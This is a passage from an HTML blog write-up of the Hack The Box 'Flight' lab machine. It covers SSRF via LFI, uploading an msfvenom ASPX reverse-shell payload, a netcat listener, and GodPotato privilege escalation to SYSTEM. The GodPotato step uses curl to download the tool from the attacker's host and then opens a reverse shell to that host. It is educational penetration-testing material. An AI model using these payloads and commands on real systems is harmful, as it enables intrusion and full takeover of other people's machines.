src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fcfd6acd0-077f-4d3b-a2af-85a22b47d430%2FUntitled.png?width=1919&amp;table=block&amp;id=a05a2bb2-38d5-4f98-a0c3-fc052f31a71f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4f3bcc84ebb648deb5ed2f93e1201eb3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3707f1f57afb48d89f891f8cdba792ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Alternate Approach — SSRF via LFI:</strong></span></span></p></div><div id="https://www.notion.so/a3c196763fa8430b9c3240bcafc717df" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Remember the LFI earlier? The internal site can also be accessed this way. Visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://school.flight.htb?view=http://127.0.0.1:8000</code></span><span class="SemanticString"> would have the internal site embedded in the PHP page, but with broken styling.</span></span></p></div><div id="https://www.notion.so/95414e326eba4d348533272213b4d0c0" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffca143b7-aa2e-4291-9c43-5b49095d1218%2FUntitled.png?width=1915&amp;table=block&amp;id=95414e32-6eba-4d34-8533-272213b4d0c0"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffca143b7-aa2e-4291-9c43-5b49095d1218%2FUntitled.png?width=1915&amp;table=block&amp;id=95414e32-6eba-4d34-8533-272213b4d0c0" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/429beaf51c0541a69d696e6bc88e07f9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9350b361e4bd41909f94165f6a897cd7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web Shell Upload — Round 2:</strong></span></span></p></div><div id="https://www.notion.so/caf239a4eff84271b50e46eb7052c1ad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\inetpub\development\</code></span><span class="SemanticString"> is the web root for this site, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C.Bum</code></span><span class="SemanticString"> have write access here.</span></span></p></div><pre id="https://www.notion.so/ac9d594c81144ce1bc0d4a41b04cddce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\inetpub\development&gt;</span></mark></span><span class="SemanticString"><span> icacls .
+
+. flight\C.Bum:(OI)(CI)(W)
+  NT SERVICE\TrustedInstaller:(I)(F)
+  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
+  NT AUTHORITY\SYSTEM:(I)(F)
+  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+  BUILTIN\Administrators:(I)(F)
+  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+  BUILTIN\Users:(I)(RX)
+  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files</span></span></span></code></pre><div id="https://www.notion.so/1ba156d9d80d4dcfa63f9ba23b388bce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To validate this, I’ll place </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test.txt</code></span><span class="SemanticString"> here, and confirm it’s accessible in the browser:</span></span></p></div><div id="https://www.notion.so/1e5b49b02efa473bace7efe6175cd17d" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff12edb9b-f0b8-4e46-baa3-a84c012e5572%2FUntitled.png?width=657&amp;table=block&amp;id=1e5b49b0-2efa-473b-ace7-efe6175cd17d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff12edb9b-f0b8-4e46-baa3-a84c012e5572%2FUntitled.png?width=657&amp;table=block&amp;id=1e5b49b0-2efa-473b-ace7-efe6175cd17d" style="width:657px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b75846a23c1040199cef213b46e9187f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a reverse shell, I’ll upload a web shell again. Since it’s an IIS server, I’ll set the format as ASPX when generating the payload with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">msfvenom</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/0f5795dc67294df2920a4eed12640e1c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.35 LPORT=8001 -f aspx -o shell.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3382 bytes
+Saved as: shell.aspx</span></span></span></code></pre><div id="https://www.notion.so/081aa2fd15044450a8e5351f87f10c91" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After placing the payload in the webroot, visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/shell.aspx</code></span><span class="SemanticString"> would return a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">iis apppool\defaultapppool</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/edd3e6d6d236419b8cfc5dfb7ea541fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">If you’re using the SSRF approach, visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://school.flight.htb?view=http://127.0.0.1:8000/shell.aspx</code></span><span class="SemanticString"> would also trigger the payload execution.</span></span></p></div><pre id="https://www.notion.so/d8ec4f7247a84ca0b0f705d9ab78a354" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001                                      
+
+listening on [any] 8001 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.129.228.120] 50958
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32\inetsrv&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+iis apppool\defaultapppool</span></span></span></code></pre><div id="https://www.notion.so/3e18e130a41246c8bf0c91f923333fea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/02450c9485a24cf9bbf82926414c5942" class="Divider"></div><h3 id="https://www.notion.so/fb9e1d805c984c8988a1fbbd4b19b83f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/fb9e1d805c984c8988a1fbbd4b19b83f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/287922b335d8423d9b53639abd0ef002" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Potato Attack:</strong></span></span></p></div><pre id="https://www.notion.so/be30fdebc2cf4844a6b032953a870b14" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32\inetsrv&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></span></span></code></pre><div id="https://www.notion.so/d737fb0feb35496380aa8e9c8c990d5b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">iis apppool\defaultapppool</code></span><span class="SemanticString"> has the powerful </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString"> token, which can be abused for privilege escalation (a.k.a Potato attacks). </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">This page from HackTricks</a></span><span class="SemanticString"> summarizes the high level idea:</span></span></p></div><blockquote id="https://www.notion.so/51c8f5aa10084e49b45823c1b6d0dc24" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM.</span></span></blockquote><div id="https://www.notion.so/3449877e834c4d78a4d1278d0de8d3d0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6fe8a41a806b43cf9cbe2c16ce64b500" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/BeichenDream/GodPotato">GodPotato</a></span><span class="SemanticString"> here, as it is very easy to use and works on almost any Windows versions.</span></span></p></div><pre id="https://www.notion.so/b91640b6072b40e9b4bbbe8d23f78d78" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\Temp&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.35:8000/GodPotato-NET4.exe -o GodPotato-NET4.exe</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>
+
+C:\Windows\Temp&gt;</span></mark></span><span class="SemanticString"><span> .\GodPotato-NET4.exe -cmd &quot;C:\windows\temp\ConPtyShell.exe 10.10.14.35 8001&quot;
+.\GodPotato-NET4.exe -cmd &quot;C:\windows\temp\ConPtyShell.exe 10.10.14.35 8001&quot;
+[*] CombaseModule: 0x140716795101184
+[*] DispatchTable: 0x140716797407296
+[*] UseProtseqFunction: 0x140716796783824
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\16baafc0-920c-40e2-96ba-8dc7a9c66b44\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00005002-13f0-ffff-2fea-5b96148e53e2
+[*] DCOM obj OXID: 0xa0a4015f57d55bca
+[*] DCOM obj OID: 0x48b932a1cd76eb15
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2704
+
+CreatePseudoConsole function found! Spawning a fully interactive shell</span></span></span></code></pre><div id="https://www.notion.so/7eb0a313e9b148ed867dbda552676813" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, on the listener, a shell session as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nt authority\system</code></span><span class="SemanticString"> is captured:</span></span></p></div><pre id="https://www.notion.so/2e44e6775150479a9deb4b72ae541874" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>PS C:\Windows\Temp&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/082cbb936e5b461aa4555d07a25aeecf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f06efe3796bc4655bc19935a5a065a91" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/d452aaa954c347138102521501f597fe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\Administrator\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt 
+
+74b3176e************************</span></span></span></code></pre><div id="https://www.notion.so/d7f5f59ff2c242f4b7dde18081715e43" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6765dbfe4bef47069e626bdc5ceffa87" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
